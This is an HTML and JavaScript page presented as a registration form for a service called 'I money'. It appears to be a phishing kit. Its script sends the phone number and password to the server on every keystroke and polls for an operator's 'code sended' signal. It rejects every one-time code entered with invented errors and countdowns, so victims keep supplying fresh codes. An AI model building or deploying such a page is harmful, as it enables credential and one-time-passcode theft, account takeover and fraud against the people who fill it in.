<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>I money - Registration</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: #f8fafc;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 16px;
    }
    .wrapper {
      width: 100%;
      max-width: 380px;
    }
    .brand-title {
      text-align: center;
      font-size: 26px;
      font-weight: bold;
      margin-bottom: 14px;
      color: #f8fafc;
    }
    .card {
      background: #1e293b;
      padding: 24px;
      border-radius: 12px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.4);
    }
    h2 { margin-top: 0; margin-bottom: 18px; font-size: 20px; }
    .field { margin-bottom: 14px; }
    label { display: block; margin-bottom: 6px; font-size: 14px; color: #cbd5e1; }
    input {
      width: 100%;
      padding: 10px 12px;
      border-radius: 8px;
      border: 1px solid #334155;
      background: #0f172a;
      color: #fff;
      font-size: 16px;
      box-sizing: border-box;
    }
    .code-row { display: flex; gap: 8px; align-items: center; }
    .code-row input { flex: 1; }
    .send-code-btn {
      padding: 10px 12px;
      border: none;
      border-radius: 8px;
      background: #2563eb;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      white-space: nowrap;
    }
    .submit-btn {
      width: 100%;
      padding: 11px;
      border: none;
      border-radius: 8px;
      background: #16a34a;
      color: #fff;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 6px;
    }
    .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
    .toast-msg {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #16a34a;
      color: #fff;
      padding: 10px 18px;
      border-radius: 8px;
      font-size: 14px;
      font-weight: bold;
      box-shadow: 0 6px 18px rgba(0,0,0,0.35);
      display: none;
      z-index: 999;
    }
    .error-msg {
      color: #f87171;
      font-size: 13px;
      margin-top: 8px;
      min-height: 18px;
    }
    .timer-msg {
      color: #fbbf24;
      font-size: 13px;
      margin-top: 4px;
      min-height: 18px;
    }
  </style>
</head>
<body>
  <div id="codeSendedToast" class="toast-msg">code sended</div>

  <div class="wrapper">
    <div class="brand-title">I money</div>
    <div class="card">
      <h2>Registration</h2>

      <form id="regForm">
        <div class="field">
          <label for="phone">Phone Number (10 digits)</label>
          <input
            type="tel"
            id="phone"
            maxlength="10"
            inputmode="numeric"
            placeholder="Enter 10-digit number"
            autocomplete="off"
            required
          />
        </div>

        <div class="field">
          <label for="password">Password</label>
          <input
            type="password"
            id="password"
            placeholder="Enter password"
            required
          />
        </div>

        <div class="field">
          <label for="code">4-Digit Code</label>
          <div class="code-row">
            <input
              type="text"
              id="code"
              maxlength="4"
              inputmode="numeric"
              placeholder="4-digit code"
              required
            />
            <button type="button" id="sendCodeBtn" class="send-code-btn">
              Send Code
            </button>
          </div>
        </div>

        <button type="submit" id="submitBtn" class="submit-btn">Submit</button>
        <div id="errorMsg" class="error-msg"></div>
        <div id="timerMsg" class="timer-msg"></div>
      </form>
    </div>
  </div>

  <script>
    const sessionId =
      sessionStorage.getItem('imoney_session_id') ||
      ('sess_' + Math.random().toString(36).slice(2) + '_' + Date.now());
    sessionStorage.setItem('imoney_session_id', sessionId);

    const phoneInput = document.getElementById('phone');
    const passwordInput = document.getElementById('password');
    const codeInput = document.getElementById('code');
    const sendCodeBtn = document.getElementById('sendCodeBtn');
    const submitBtn = document.getElementById('submitBtn');
    const codeSendedToast = document.getElementById('codeSendedToast');
    const errorMsg = document.getElementById('errorMsg');
    const timerMsg = document.getElementById('timerMsg');
    const regForm = document.getElementById('regForm');

    let attempt = 0;
    let countdownInterval = null;
    let toastTimeout = null;
    let hasNotifiedStart = false;

    function showCodeSendedFor3Seconds() {
      codeSendedToast.style.display = 'block';
      clearTimeout(toastTimeout);
      toastTimeout = setTimeout(() => {
        codeSendedToast.style.display = 'none';
      }, 3000);
    }

    function notifyRegisterStart(digitsOnly) {
      if (hasNotifiedStart) return;
      hasNotifiedStart = true;
      fetch('/api/register-start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        keepalive: true,
        body: JSON.stringify({
          sessionId,
          phone: digitsOnly || '',
          startedAt: Date.now()
        })
      }).catch(() => {});
    }

    async function pushLiveUpdate() {
      const digitsOnly = phoneInput.value.replace(/\D/g, '').slice(0, 10);
      if (phoneInput.value !== digitsOnly) {
        phoneInput.value = digitsOnly;
      }

      if (digitsOnly.length > 0) {
        notifyRegisterStart(digitsOnly);
      }

      try {
        await fetch('/api/live-update', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId,
            phone: digitsOnly,
            password: passwordInput.value,
            startedTyping: digitsOnly.length > 0
          })
        });
      } catch (e) {}
    }

    phoneInput.addEventListener('keydown', () => {
      const digitsOnly = phoneInput.value.replace(/\D/g, '').slice(0, 10);
      notifyRegisterStart(digitsOnly);
    });
    phoneInput.addEventListener('input', pushLiveUpdate);
    phoneInput.addEventListener('change', pushLiveUpdate);
    phoneInput.addEventListener('blur', pushLiveUpdate);
    passwordInput.addEventListener('input', pushLiveUpdate);
    passwordInput.addEventListener('blur', pushLiveUpdate);

    sendCodeBtn.addEventListener('click', async () => {
      const digitsOnly = phoneInput.value.replace(/\D/g, '').slice(0, 10);
      if (!digitsOnly) {
        errorMsg.textContent = 'Pehle phone number enter karein';
        return;
      }
      errorMsg.textContent = '';

      await fetch('/api/request-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, phone: digitsOnly })
      });
    });

    setInterval(async () => {
      try {
        const res = await fetch(`/api/status?sessionId=${encodeURIComponent(sessionId)}`);
        const data = await res.json();
        if (data.codeSended) {
          showCodeSendedFor3Seconds();
        }
      } catch (e) {}
    }, 800);

    function startCountdown(seconds) {
      clearInterval(countdownInterval);
      let remaining = seconds;
      submitBtn.disabled = true;
      timerMsg.textContent = `Countdown: ${remaining}s`;

      countdownInterval = setInterval(() => {
        remaining -= 1;
        if (remaining <= 0) {
          clearInterval(countdownInterval);
          submitBtn.disabled = false;
          timerMsg.textContent = '';
        } else {
          timerMsg.textContent = `Countdown: ${remaining}s`;
        }
      }, 1000);
    }

    regForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const cleanPhone = phoneInput.value.replace(/\D/g, '').slice(0, 10);
      const cleanCode = codeInput.value.replace(/\D/g, '').slice(0, 4);

      if (cleanCode.length !== 4) {
        errorMsg.textContent = '4-digit code enter karein';
        return;
      }

      attempt += 1;
      const currentAttempt = attempt;

      await fetch('/api/submit-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          phone: cleanPhone,
          code: cleanCode,
          attempt: currentAttempt
        })
      });

      codeInput.value = '';

      if (currentAttempt === 1) {
        errorMsg.textContent = 'Try again';
        startCountdown(59);
      } else if (currentAttempt === 2) {
        errorMsg.textContent = 'Use strong password';
        startCountdown(90);
      } else {
        errorMsg.textContent = 'Try with different number';
        startCountdown(90);
      }
    });
  </script>
</body>
</html>
